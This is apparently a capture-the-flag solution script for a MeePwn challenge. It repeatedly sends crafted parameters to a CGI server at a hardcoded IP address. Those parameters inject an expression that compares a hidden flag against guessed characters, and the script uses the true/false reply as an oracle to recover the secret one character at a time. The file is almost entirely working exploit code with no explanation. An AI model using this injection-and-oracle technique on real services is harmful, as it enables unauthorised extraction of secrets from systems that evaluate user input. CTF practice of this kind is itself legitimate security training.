import requests
import time
import string

# alphabet = list("!#$%&*+,-./") + [chr(a) for a in range(ord('0'), ord("9")+1 )] + \
# ["_"] + [chr(a) for a in range(ord('a'), ord("z")+1 )] + list("|}~")

# [chr(a) for a in range(ord('A'), ord("Z")+1 )] + \

# alphabet = list(string.printable)

alphabet = list(string.printable)

alphabet = [ord(x) for x in alphabet]
alphabet.sort()

# print(alphabet)

alphabet = [chr(x) for x in alphabet]

alphabet.sort()

# blacklist = ['(',')','[',']','\'','"']
blacklist = list()

alphabet = [x for x in alphabet if x not in blacklist][6:]



print(alphabet)


# cguess = "MeePwnCTF{python3"
# cguess = "Me"

prefix = "MeePwnCTF{python3.66666666666666"

# cguess = "MeePwnCTF{python3.66666666666666_&~~"
# cguess = "MeePwnCTF{python3.66666666666666"
# MeePwnCTF{python3.66666666666666

# cguess= "_([_((you_passed_this?]]]]]])}"
cguess= "_([_((you_passed_this?]]]]]])"

op = "+'"

val2 = "< FLAG#"

cchar = "0"


while True:
	print(cguess)

	for c in alphabet:
		cchar = c

		print(c, end=" ", flush=True)

		params = {
			'value1': prefix,
			'op': op,
			'value2': "+source < FLAG #",
			'source': cguess+cchar
		}

		time.sleep(0.1)

		r = requests.get(url = "http://178.128.96.203/cgi-bin/server.py", params = params )

		# print(r.text)

		if "True" not in r.text:
			cguess += alphabet[alphabet.index(cchar)-1]
			print("got: " + prefix + cguess)
			break
